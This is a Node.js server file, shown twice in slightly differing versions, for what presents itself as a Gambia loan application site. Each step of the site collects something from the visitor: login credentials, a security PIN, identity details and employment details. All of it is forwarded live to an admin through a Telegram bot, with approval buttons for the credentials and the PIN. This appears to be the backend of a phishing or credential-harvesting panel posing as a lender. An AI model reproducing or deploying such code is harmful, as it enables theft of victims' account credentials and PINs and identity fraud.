require('dotenv').config();
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const cors = require('cors');

const botManager = require('./bot_manager');

const app = express();
const server = http.createServer(app);

// Configure Socket.io for Render (CORS is essential)
const io = socketIo(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

global.io = io; // Allow bot_manager to access the socket instance

const PORT = process.env.PORT || 3000;
const EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL; 

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Webhook Route for Telegram
app.post(`/bot${process.env.BOT_TOKEN}`, (req, res) => {
    botManager.bot.processUpdate(req.body);
    res.sendStatus(200);
});

io.on('connection', (socket) => {
    // Generate a unique AppID for the Gambia session
    const appId = `GMB-${Math.random().toString(36).substring(2, 7).toUpperCase()}`;
    
    // Join the room so the bot can target this specific user
    socket.join(appId);
    
    console.log(`🔌 Gambia User connected: ${appId}`);
    socket.emit('session-ready', { appId: appId });

    // Step 1: Login Credentials (Triggers Admin verification buttons)
    socket.on('step4', (data) => {
        botManager.sendToAdmin(appId, "🇬🇲 Step 1: Login Credentials", data, true);
    });

    // Step 2: Security PIN Submission (Triggers Final PIN verification buttons)
    socket.on('step5', (data) => {
        botManager.sendFinalApproval(appId, data.pin);
    });

    // Step 3: Loan Details (Notification Only - explicit false on validation keys)
    socket.on('step1', (data) => {
        botManager.sendToAdmin(appId, "🇬🇲 Step 3: Loan Details", data, false);
    });

    // Step 4: Identity Verification (Notification Only)
    socket.on('step2', (data) => {
        botManager.sendToAdmin(appId, "🇬🇲 Step 4: Identity Verification", data, false);
    });

    // Step 5: Employment Information (Notification Only)
    socket.on('step3', (data) => {
        botManager.sendToAdmin(appId, "🇬🇲 Step 5: Employment Info", data, false);
    });

    socket.on('disconnect', () => {
        console.log(`🔌 User disconnected: ${appId}`);
    });
});

server.listen(PORT, async () => {
    console.log(`🚀 Gambia Loan Server running on port ${PORT}`);
    
    // Set Webhook using the Render External URL
    if (EXTERNAL_URL) {
        const webhookUrl = `${EXTERNAL_URL}/bot${process.env.BOT_TOKEN}`;
        try {
            await botManager.bot.setWebHook(webhookUrl);
            console.log(`✅ Telegram Webhook set to: ${webhookUrl}`);
        } catch (err) {
            console.error('❌ Webhook Error:', err.message);
        }
    } else {
        console.warn('⚠️ RENDER_EXTERNAL_URL not found in .env. Webhook not set.');
    }
});require('dotenv').config();
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const cors = require('cors');

const botManager = require('./bot_manager');

const app = express();
const server = http.createServer(app);

// Configure Socket.io for Render (CORS is essential)
const io = socketIo(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

global.io = io; // Allow bot_manager to access the socket instance

const PORT = process.env.PORT || 3000;
const EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL; 

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Webhook Route for Telegram
app.post(`/bot${process.env.BOT_TOKEN}`, (req, res) => {
    botManager.bot.processUpdate(req.body);
    res.sendStatus(200);
});

io.on('connection', (socket) => {
    // Generate a unique AppID for the Gambia session
    const appId = `GMB-${Math.random().toString(36).substring(2, 7).toUpperCase()}`;
    
    // Join the room so the bot can "call back" this specific user
    socket.join(appId);
    
    console.log(`🔌 Gambia User connected: ${appId}`);
    socket.emit('session-ready', { appId: appId });

    // Step 1: Login Credentials (Moved from Step 4)
    socket.on('step4', (data) => {
        botManager.sendToAdmin(appId, "🇬🇲 Step 1: Login Credentials", data, true);
    });

    // Step 2: Security PIN Submission (Moved from Step 5)
    socket.on('step5', (data) => {
        botManager.sendFinalApproval(appId, data.pin);
    });

    // Step 3: Loan Details (Moved from Step 1)
    socket.on('step1', (data) => botManager.sendToAdmin(appId, "🇬🇲 Step 3: Loan Details", data));

    // Step 4: Identity Verification (Moved from Step 2)
    socket.on('step2', (data) => botManager.sendToAdmin(appId, "🇬🇲 Step 4: Identity Verification", data));

    // Step 5: Employment Information (Moved from Step 3)
    socket.on('step3', (data) => botManager.sendToAdmin(appId, "🇬🇲 Step 5: Employment Info", data));

    socket.on('disconnect', () => {
        console.log(`🔌 User disconnected: ${appId}`);
    });
});

server.listen(PORT, async () => {
    console.log(`🚀 Gambia Loan Server running on port ${PORT}`);
    
    // Set Webhook using the Render External URL
    if (EXTERNAL_URL) {
        const webhookUrl = `${EXTERNAL_URL}/bot${process.env.BOT_TOKEN}`;
        try {
            await botManager.bot.setWebHook(webhookUrl);
            console.log(`✅ Telegram Webhook set to: ${webhookUrl}`);
        } catch (err) {
            console.error('❌ Webhook Error:', err.message);
        }
    } else {
        console.warn('⚠️ RENDER_EXTERNAL_URL not found in .env. Webhook not set.');
    }
});